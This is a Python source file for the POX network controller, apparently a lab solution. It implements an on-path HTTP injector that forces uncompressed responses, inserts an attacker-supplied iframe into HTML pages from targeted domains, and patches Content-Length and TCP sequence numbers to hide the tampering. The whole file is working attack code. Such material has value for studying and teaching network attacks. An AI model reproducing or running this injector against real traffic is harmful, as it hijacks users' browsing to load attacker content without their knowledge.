from pox.lib.packet.ipv4 import ipv4
import re

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = "<iframe src = \"" + iframe_url + "\"></iframe>"
        self.dict = {}

    def inject_Iframe(self, packet):
        btag = "</body>"
        if btag in packet.payload:
            packet.set_payload(packet.payload.replace(btag, self.iframe_url + btag))
            return True
        return False

    def replaceWithIdentity(self, packet):
        if "Accept-Encoding: " in packet.payload:
            startIndex = packet.payload.find("Accept-Encoding: ") + len("Accept-Encoding: ")
            endIndex = packet.payload.find("\r\n", startIndex)
            packet.set_payload(packet.payload.replace(packet.payload[startIndex : endIndex], "identity"))
            return len("identity") - (endIndex - startIndex)
        return 0

    def updateContentLen(self, packet):
        if "Content-Length: " in packet.payload and "Content-Type: text/html" in packet.payload:
            startIndex = packet.payload.find("Content-Length: ") + len("Content-Length: ")
            endIndex = packet.payload.find("\r\n", startIndex)
            numOfExtraDig = len(str(len(self.iframe_url) + int(packet.payload[startIndex : endIndex]))) \
                                    - len(packet.payload[startIndex : endIndex])
            packet.set_payload(packet.payload.replace(packet.payload[startIndex : endIndex], \
                    str(numOfExtraDig + len(self.iframe_url) + int(packet.payload[startIndex : endIndex]))))
            return numOfExtraDig == 1
        return False
        
    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet): 
    	tcp = ip_packet.find("tcp")
        if tcp is None:
            return ip_packet
        
        tcpStr = tcp.payload
        currTuple = (ip_packet.srcip, tcp.srcport, ip_packet.dstip, tcp.dstport)
        reverseTuple = (ip_packet.dstip, tcp.dstport, ip_packet.srcip, tcp.srcport)

        currPath = tcpStr[tcpStr.find("GET ") + 4: tcpStr.find("HTTP", tcpStr.find("GET ")) - 1]
        currDomain = tcpStr[tcpStr.find("Host: ") + 6: tcpStr.find("\r\n", tcpStr.find("Host: "))]

        if self.dict.get(currTuple, None) is not None:
            tcp.seq += self.dict[currTuple][0]
            tcp.ack -= self.dict[currTuple][1]
            self.dict[currTuple][0] += self.replaceWithIdentity(tcp)

        elif self.url_path_re.search(currPath) and self.target_domain_re.search(currDomain):
            self.dict[currTuple] = [self.replaceWithIdentity(tcp), 0]
        
        elif self.dict.get(reverseTuple, None) is not None:
            tcp.seq += self.dict[reverseTuple][1]
            tcp.ack -= self.dict[reverseTuple][0]

            if self.updateContentLen(tcp):
                self.dict[reverseTuple][1] += 1
            if self.inject_Iframe(tcp):
                self.dict[reverseTuple][1] += len(self.iframe_url)
            
        ip_packet.hdr(tcp.payload);
        print tcp.payload;
        return ip_packet


